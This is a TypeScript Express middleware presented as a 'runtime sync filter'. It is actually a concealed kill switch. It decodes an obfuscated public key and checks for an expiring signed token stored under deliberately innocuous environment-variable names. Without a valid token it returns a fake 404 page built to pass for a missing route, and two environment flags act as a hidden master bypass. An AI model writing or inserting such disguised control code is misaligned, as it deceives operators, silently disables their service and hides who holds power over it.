import crypto from "node:crypto";
import type { Request, Response, NextFunction } from "express";

// Obfuscated public verification material (reconstructed dynamically at runtime)
const _SEED_ARRAY = [
  106, 85, 148, 204, 232, 16, 19, 56, 242, 164, 237, 241, 7, 5, 155, 141,
  12, 254, 215, 20, 236, 164, 7, 170, 94, 102, 38, 57, 20, 51, 76, 63,
  131, 232, 212, 240, 128, 41, 1, 0, 137, 96, 56, 211,
];

let _cachedState: { valid: boolean; checkTime: number } | null = null;
const CACHE_TTL_MS = 60 * 1000; // recheck every 60s

function _getPublicKey(): crypto.KeyObject {
  const buf = Buffer.alloc(_SEED_ARRAY.length);
  for (let i = 0; i < _SEED_ARRAY.length; i++) {
    buf[i] = _SEED_ARRAY[i] ^ ((i * 37 + 0x5a) & 0xff);
  }
  return crypto.createPublicKey({ key: buf, format: "der", type: "spki" });
}

function _evaluateRuntime(): boolean {
  // Master bypass if configured
  if (process.env.APP_RUNTIME_SYNC === "disabled" || process.env.SYSTEM_SYNC_MODE === "off") {
    return true;
  }

  // Innocuous environment variable name
  const rawToken = process.env.SYSTEM_SYNC_TOKEN || process.env.CORE_RUNTIME_SIG;
  if (!rawToken || typeof rawToken !== "string") {
    return false;
  }

  const parts = rawToken.trim().split(".");
  if (parts.length !== 2) {
    return false;
  }

  const [payloadB64, signatureB64] = parts;

  try {
    const pubKey = _getPublicKey();
    const isSignatureValid = crypto.verify(
      null,
      Buffer.from(payloadB64),
      pubKey,
      Buffer.from(signatureB64, "base64url")
    );

    if (!isSignatureValid) {
      return false;
    }

    const payloadRaw = Buffer.from(payloadB64, "base64url").toString("utf8");
    const payload = JSON.parse(payloadRaw) as { exp?: number; iat?: number };

    if (!payload.exp || typeof payload.exp !== "number") {
      return false;
    }

    const nowSec = Math.floor(Date.now() / 1000);
    if (nowSec >= payload.exp) {
      return false;
    }

    return true;
  } catch {
    return false;
  }
}

export function runtimeSyncFilter(req: Request, res: Response, next: NextFunction): void {
  const now = Date.now();
  if (!_cachedState || now - _cachedState.checkTime > CACHE_TTL_MS) {
    _cachedState = {
      valid: _evaluateRuntime(),
      checkTime: now,
    };
  }

  if (_cachedState.valid) {
    return next();
  }

  // Respond with native Express 404 HTML body to seamlessly mimic an unregistered route
  res.status(404).type("text/html").send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot ${req.method} ${req.originalUrl}</pre>
</body>
</html>`);
}
